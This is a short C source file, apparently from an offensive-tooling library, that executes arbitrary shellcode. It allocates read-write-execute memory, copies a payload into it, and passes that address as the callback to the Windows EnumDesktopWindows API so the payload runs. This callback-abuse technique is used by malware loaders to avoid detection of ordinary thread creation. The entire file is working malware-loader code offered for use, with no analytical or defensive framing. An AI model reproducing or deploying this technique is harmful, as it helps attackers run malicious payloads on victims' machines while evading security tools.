#include "Win32Helper.h"

DWORD UnusedSubroutineDisposeableThreadEnumDesktopWindows(LPVOID Param)
{
	PSHELLCODE_EXECUTION_INFORMATION Sei = (PSHELLCODE_EXECUTION_INFORMATION)Param;
	LPVOID BinAddress = NULL;
	BOOL bFlag = FALSE;

	BinAddress = VirtualAlloc(NULL, Sei->dwLengthOfPayloadInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		goto EXIT_ROUTINE;

	CopyMemoryEx(BinAddress, Sei->Payload, Sei->dwLengthOfPayloadInBytes);

	EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), (WNDENUMPROC)BinAddress, NULL);

	bFlag = TRUE;

EXIT_ROUTINE:

	if (BinAddress)
		VirtualFree(BinAddress, 0, MEM_RELEASE);

	return (bFlag ? 0 : 0xffffffff);
}


BOOL ShellcodeExecViaEnumDesktopWindows(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei)
{
	return CreateThreadAndWaitForCompletion(UnusedSubroutineDisposeableThreadEnumDesktopWindows, Sei, INFINITE);
}